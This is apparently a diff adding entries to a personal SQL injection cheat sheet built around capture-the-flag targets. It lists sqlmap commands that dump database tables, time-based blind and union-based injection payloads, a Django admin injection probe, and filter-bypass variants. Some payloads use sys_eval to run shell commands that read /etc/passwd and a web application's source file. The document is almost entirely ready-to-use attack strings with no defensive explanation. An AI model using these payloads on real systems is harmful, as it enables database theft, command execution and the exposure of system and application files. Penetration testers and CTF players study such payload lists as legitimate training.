@@ -198,3 +198,26 @@ sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T
 sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book --tables
 sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T flag --columns
 sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T flag --dump
+
+==================
+boolean blind based, sql injection(可联合查询注入)
+1' and sleep(5) -- #
+1' and case when true then sleep(1) else sleep(2) end -- #
+1' and case when (select sys_eval('cat /var/www/index.php'))='<' then sleep(10) else sleep(2) end -- #
+=====
+unions based
+1' and '1'='1' ;-- #
+1’ and '1'='1' union select 1,2,3,4,5,6,7,8;-- #
+1' and '1'='1' union select 1,2,3,4,5,6,group_concat(sys_eval('cat /etc/passwd')),8;-- #
+
+===========
+django
+admin/t/collection/?detail__a%27
+/admin/t/collection/?detail__a*
+
+====================
+=>sqli req.txt body parameter with blocking some
+1' && '1'='1' ;-- #
+1’ && '1'='1' union select 1,2,3,4,5,6,7,8;-- #
+1' && '1'='0' union SELECT  1,2,3,4,5,6,group_concat(table_name),8 from sys.schema_table_statistics ;-- #
+1' && '1'='0' union/* */SELECT 1,2,(select `1` from (select 1 union/* */SELECT * from flag)secplayground limit 1,1),4,5,6,7,8 ;-- #
